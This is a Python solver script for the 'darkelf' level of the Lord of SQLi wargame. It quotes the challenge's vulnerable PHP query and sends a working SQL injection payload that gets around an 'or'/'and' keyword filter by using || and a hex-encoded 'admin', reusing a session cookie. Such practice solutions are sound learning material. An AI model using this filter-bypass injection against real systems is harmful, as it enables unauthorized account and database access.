#!/usr/bin/env python3
import pickle
import los
from getpass import getpass


def main():
    '''
    Darkelf

    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
    if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
    $query = "select id from prob_darkelf where id='guest' and pw='{$_GET[pw]}'"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
    if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
    if($result['id'] == 'admin') solve("darkelf"); 

    '''

    url = "https://los.rubiya.kr/chall/darkelf_c6a5ed64c4f6a7a5595c24977376136b.php"

    try:
        with open('cooks.pickle', 'rb') as f:
            cook = pickle.load(f)
    except:
        cook = {'PHPSESSID': getpass(
            prompt='enter PHPSESSID cookie: ')}

    param = dict(pw="'||id=0x61646d696e#")

    response = los.get_request(url, param, cook)

    if 'Clear!' in response:
        print('DARKELF Clear!')

    # Save cookie
    los.save_cookies(cook)


if __name__ == '__main__':
    main()
